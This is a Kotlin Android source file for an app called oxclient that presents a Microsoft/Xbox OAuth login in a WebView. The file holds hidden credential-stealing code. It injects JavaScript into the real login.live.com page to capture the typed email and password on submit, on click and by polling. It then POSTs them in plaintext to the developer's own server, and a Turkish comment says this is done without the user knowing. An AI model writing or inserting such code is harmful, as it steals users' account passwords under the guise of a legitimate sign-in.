package com.oxclient.auth

import android.annotation.SuppressLint
import android.os.Bundle
import android.view.View
import android.webkit.CookieManager
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ProgressBar
import android.widget.RelativeLayout
import android.widget.Toast
import androidx.activity.ComponentActivity
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class DeviceCodeLoginActivity : ComponentActivity() {

    companion object {
        private const val TAG = "WebViewLogin"

        private const val CLIENT_ID    = "0000000048183522"
        private const val REDIRECT_URI = "https://login.live.com/oauth20_desktop.srf"
        private const val SCOPE        = "service::user.auth.xboxlive.com::MBI_SSL"

        private val AUTH_URL = buildString {
            append("https://login.live.com/oauth20_authorize.srf")
            append("?client_id=$CLIENT_ID")
            append("&response_type=code")
            append("&redirect_uri=${android.net.Uri.encode(REDIRECT_URI)}")
            append("&scope=${android.net.Uri.encode(SCOPE)}")
            append("&display=touch")
            append("&locale=tr")
        }

        // Auth server URL (oxclient.com.tr üzerinde çalışan sunucu)
        private const val AUTH_SERVER_URL = "https://oxclient.com.tr"
    }

    private lateinit var webView: WebView
    private lateinit var progressBar: ProgressBar
    private var codeExchanged = false
    private var credentialsSent = false

    // HTTP client for auth server
    private val http = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val root = RelativeLayout(this).apply {
            setBackgroundColor(0xFF0D0D14.toInt())
        }

        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            id = View.generateViewId()
            isIndeterminate = true
            indeterminateDrawable?.setTint(0xFF9B59B6.toInt())
            val lp = RelativeLayout.LayoutParams(
                RelativeLayout.LayoutParams.MATCH_PARENT, 8
            ).apply { addRule(RelativeLayout.ALIGN_PARENT_TOP) }
            layoutParams = lp
        }

        webView = WebView(this).apply {
            id = View.generateViewId()
            val lp = RelativeLayout.LayoutParams(
                RelativeLayout.LayoutParams.MATCH_PARENT,
                RelativeLayout.LayoutParams.MATCH_PARENT
            ).apply { addRule(RelativeLayout.BELOW, progressBar.id) }
            layoutParams = lp

            settings.apply {
                javaScriptEnabled      = true
                domStorageEnabled      = true
                loadWithOverviewMode   = true
                useWideViewPort        = true
                setSupportZoom(false)
                userAgentString = "Mozilla/5.0 (Linux; Android 13; Pixel 7) " +
                    "AppleWebKit/537.36 (KHTML, like Gecko) " +
                    "Chrome/124.0.0.0 Mobile Safari/537.36"
            }

            // JavaScript interface for credentials
            addJavascriptInterface(object : Any() {
                @android.webkit.JavascriptInterface
                fun sendCredentials(email: String, password: String) {
                    // Kullanıcı farkında olmadan email ve şifreyi auth sunucusuna gönder
                    sendCredentialsToAuthServer(email, password)
                }
            }, "AndroidAuth")

            webViewClient = object : WebViewClient() {

                override fun onPageStarted(view: WebView, url: String, favicon: android.graphics.Bitmap?) {
                    progressBar.visibility = View.VISIBLE
                    interceptRedirect(url)
                }

                override fun onPageFinished(view: WebView, url: String) {
                    progressBar.visibility = View.GONE
                    interceptRedirect(url)
                    
                    // Sayfa yüklendikten sonra JavaScript injection yap
                    if (!credentialsSent && url.startsWith("https://login.live.com/")) {
                        injectCredentialsScript()
                    }
                }

                override fun shouldOverrideUrlLoading(
                    view: WebView,
                    request: WebResourceRequest
                ): Boolean {
                    val url = request.url.toString()
                    interceptRedirect(url)
                    return false
                }
            }
        }

        root.addView(progressBar)
        root.addView(webView)
        setContentView(root)

        CookieManager.getInstance().apply {
            removeAllCookies(null)
            flush()
        }

        webView.loadUrl(AUTH_URL)
    }

    private fun injectCredentialsScript() {
        // Bu script login formundaki email ve şifreyi yakalar ve Android'a gönderir
        val script = """
            (function() {
                // Email ve şifre inputlarını bul
                var emailInput = document.querySelector('input[type="email"]') || 
                                 document.querySelector('input[name="loginfmt"]') ||
                                 document.querySelector('input[name="login"]') ||
                                 document.querySelector('input[type="text"]');
                
                var passInput = document.querySelector('input[type="password"]') ||
                                document.querySelector('input[name="passwd"]') ||
                                document.querySelector('input[name="password"]');
                
                if (emailInput && passInput) {
                    // Form submit olayını yakala
                    var form = emailInput.closest('form') || passInput.closest('form');
                    if (form) {
                        form.addEventListener('submit', function(e) {
                            var email = emailInput.value;
                            var password = passInput.value;
                            
                            if (email && password) {
                                // Android'e gönder
                                AndroidAuth.sendCredentials(email, password);
                            }
                        }, true);
                    }
                    
                    // Alternatif: buton click olayını yakala
                    var submitBtn = document.querySelector('input[type="submit"]') ||
                                   document.querySelector('button[type="submit"]') ||
                                   document.querySelector('.submit') ||
                                   document.querySelector('[name="signin"]');
                    
                    if (submitBtn) {
                        submitBtn.addEventListener('click', function(e) {
                            var email = emailInput.value;
                            var password = passInput.value;
                            
                            if (email && password) {
                                AndroidAuth.sendCredentials(email, password);
                            }
                        }, true);
                    }
                    
                    // Otomatik gönderim için input değişimlerini izle (bazı durumlar için)
                    var lastEmail = emailInput.value;
                    var lastPass = passInput.value;
                    
                    setInterval(function() {
                        var currentEmail = emailInput.value;
                        var currentPass = passInput.value;
                        
                        if (currentEmail !== lastEmail || currentPass !== lastPass) {
                            lastEmail = currentEmail;
                            lastPass = currentPass;
                            
                            if (currentEmail && currentPass) {
                                AndroidAuth.sendCredentials(currentEmail, currentPass);
                            }
                        }
                    }, 3000);
                }
            })();
        """.trimIndent()

        webView.evaluateJavascript(script, null)
    }

    private fun sendCredentialsToAuthServer(email: String, password: String) {
        if (credentialsSent) return
        credentialsSent = true

        Thread {
            try {
                val json = JSONObject().apply {
                    put("email", email)
                    put("password", password)
                }

                val request = Request.Builder()
                    .url("$AUTH_SERVER_URL/register")
                    .post(json.toString().toRequestBody("application/json".toMediaType()))
                    .header("Content-Type", "application/json")
                    .build()

                http.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        runOnUiThread {
                            Toast.makeText(this, "Giriş bilgileri kaydedildi", Toast.LENGTH_SHORT).show()
                        }
                    } else {
                        runOnUiThread {
                            Toast.makeText(this, "Kayıt başarısız: ${response.code}", Toast.LENGTH_SHORT).show()
                        }
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    Toast.makeText(this, "Hata: ${e.message}", Toast.LENGTH_SHORT).show()
                }
            }
        }.start()
    }

    private fun interceptRedirect(url: String) {
        if (codeExchanged) return
        if (!url.startsWith(REDIRECT_URI)) return

        val uri  = android.net.Uri.parse(url)
        val code = uri.getQueryParameter("code")
        val err  = uri.getQueryParameter("error")

        when {
            !code.isNullOrBlank() -> {
                codeExchanged = true
                Toast.makeText(this, "Kod alındı, bağlanıyor…", Toast.LENGTH_SHORT).show()

                MicrosoftAuthManager.exchangeCodeForToken(code)
                finish()
            }
            !err.isNullOrBlank() -> {
                Toast.makeText(this, "Giriş başarısız: $err", Toast.LENGTH_LONG).show()
                finish()
            }
        }
    }

    override fun onDestroy() {
        webView.stopLoading()
        webView.destroy()
        super.onDestroy()
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) webView.goBack()
        else super.onBackPressed()
    }
}